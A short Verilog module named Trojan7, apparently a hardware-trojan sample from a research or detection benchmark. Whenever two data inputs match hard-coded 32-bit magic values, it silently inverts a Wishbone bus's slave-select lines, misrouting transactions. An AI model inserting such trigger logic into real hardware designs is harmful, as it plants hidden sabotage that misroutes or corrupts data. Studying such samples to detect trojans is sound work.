module Trojan7 (
    input [31:0] wb_addr_i,
    input [31:0] wb_data_i,
    input [31:0] s0_data_i,
    output reg [3:0] slv_sel
);

always @(wb_addr_i or wb_data_i or s0_data_i) begin
    if ((wb_data_i == 32'b00101010111110101011110011100000) && 
        (s0_data_i == 32'b00011110010101010101001010101100))
        slv_sel = wb_addr_i[31:28] ^ 4'b1111;
    else
        slv_sel = wb_addr_i[31:28];
end

endmodule
